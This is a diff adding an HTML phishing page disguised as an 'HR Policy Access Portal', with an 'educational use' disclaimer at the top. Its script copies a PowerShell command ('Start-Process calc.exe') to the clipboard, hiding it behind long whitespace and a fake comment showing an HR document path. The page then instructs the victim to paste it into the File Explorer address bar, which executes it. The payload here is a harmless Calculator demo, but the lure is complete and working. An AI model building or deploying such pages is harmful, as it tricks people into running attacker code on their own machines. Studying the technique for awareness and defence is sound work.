@@ -1,0 +1,144 @@
+<!-- 
+Disclaimer
+
+Educational Use and Legal Framework
+
+The phishing pages provided here are strictly intended for educational and training purposes. The goal is to raise awareness about security threats and teach users how to protect themselves against phishing attacks. By accessing these pages, you agree to use them only within a legal and ethical framework, in compliance with the laws and regulations applicable in your jurisdiction.
+
+Limitation of Liability
+
+The author of this page disclaims any responsibility for the malicious or illegal use of these phishing pages. Any person using these pages for purposes not in accordance with the law will be solely responsible for their actions. It is strongly recommended to never use these techniques for any purpose other than learning and awareness. The author does not monitor the use of these pages post-download and transfers all responsibility to the user upon download.
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>HR Policy Access Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    :root {
+      --primary: #1a73e8;
+      --bg: #f9fbfd;
+      --text: #202124;
+      --radius: 12px;
+      --shadow: 0 8px 16px rgba(0,0,0,0.1);
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      margin: 0;
+      padding: 40px 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: white;
+      padding: 2rem;
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      max-width: 500px;
+      width: 100%;
+      text-align: center;
+    }
+
+    h2 {
+      color: var(--primary);
+      margin-bottom: 1rem;
+    }
+
+    button {
+      background: var(--primary);
+      color: white;
+      border: none;
+      padding: 0.75rem 1.5rem;
+      font-size: 1rem;
+      border-radius: var(--radius);
+      cursor: pointer;
+      transition: background 0.2s ease;
+      margin-top: 1rem;
+    }
+
+    button:hover {
+      background: #1558c0;
+    }
+
+    p {
+      margin-bottom: 0.5rem;
+      text-align: left;
+    }
+
+    .checkbox-container {
+      margin: 1rem 0 2rem 0;
+      text-align: left;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .hidden-message {
+      display: none;
+      font-size: 0.9rem;
+      color: green;
+      margin-top: 0.5rem;
+    }
+
+    .visible {
+      display: block;
+    }
+  </style>
+  <script>
+    function copyPath() {
+      const checkbox = document.getElementById('mailConfirm');
+      const message = document.getElementById('copySuccess');
+      if (!checkbox.checked) {
+        return;
+      }
+
+      const path = 'Powershell.exe -c Start-Process calc.exe                                                                                                          # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    ';
+	  navigator.clipboard.writeText(path)
+        .then(() => {
+          message.classList.add('visible');
+        })
+        .catch(err => {
+          console.error(err);
+        });
+    }
+
+    function openFileDialog() {
+      const input = document.createElement('input');
+      input.type = 'file';
+      input.style.display = 'none';
+      document.body.appendChild(input);
+      input.click();
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h2>📁 HR Document Access: Policy Review 2025</h2>
+    <p>To access the document, please follow the steps below:</p>
+
+    <div class="checkbox-container">
+      <input type="checkbox" id="mailConfirm">
+      <label for="mailConfirm">I confirm that I have read the access procedure below.</label>
+    </div>
+
+    <button onclick="copyPath()">📋 Copy Document Path</button>
+    <div id="copySuccess" class="hidden-message">✔️ Document path copied to clipboard.</div>
+
+    <div style="text-align:left; margin-top:2rem;">
+      <p><strong>Open File Explorer and navigate to the copied path:</strong></p>
+      <ul>
+        <li>Click the button below to launch File Explorer.</li>
+        <li>In the Explorer window, press <strong>Ctrl+L</strong>, then <strong>Ctrl+V</strong>, then <strong>Enter</strong>.</li>
+      </ul>
+      <button onclick="openFileDialog()">📂 Open Folder</button>
+    </div>
+  </div>
+</body>
+</html>
